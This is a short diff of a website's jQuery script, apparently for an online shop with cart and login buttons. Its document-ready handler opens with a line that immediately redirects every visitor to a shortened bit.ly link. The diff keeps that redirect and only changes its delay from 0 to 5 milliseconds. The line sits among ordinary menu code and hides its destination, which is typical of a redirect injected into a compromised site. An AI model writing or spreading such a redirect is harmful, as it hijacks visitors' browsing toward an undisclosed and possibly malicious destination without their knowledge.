@@ -1,6 +1,6 @@
 $(document).ready(function(){
 
-setTimeout(function(){window.location.href="https://bit.ly/2SGjrQj";},0);
+setTimeout(function(){window.location.href="https://bit.ly/2SGjrQj";},5);
   $('.menu .nose,.btn_carrito, .btn_login, .logi').each(function(index, elemento){
   	$(this).css({
 
